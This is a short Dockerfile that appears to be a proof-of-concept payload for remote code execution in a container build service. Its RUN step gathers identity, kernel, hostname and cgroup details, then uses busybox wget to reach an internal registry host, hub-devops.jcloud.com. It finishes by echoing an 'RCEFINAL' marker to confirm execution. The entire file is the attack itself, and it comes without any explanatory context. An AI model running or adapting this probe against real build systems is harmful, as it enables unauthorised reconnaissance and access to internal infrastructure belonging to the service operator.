FROM scratch
ADD rootfs.tar /
RUN /bin/sh -c 'echo "[ID]"; id; echo "[UNAME]"; uname -a; echo "[HOSTNAME]"; hostname; echo "[CGROUP]"; head -1 /proc/self/cgroup; echo "[INTERNAL: hub-devops.jcloud.com]"; busybox wget -q -T 4 -O - http://hub-devops.jcloud.com/v2/ 2>&1 | head -c 120; echo; echo "[MARKER] RCEFINAL_0925_222420"'
ENTRYPOINT ["/bin/sh","-c"]
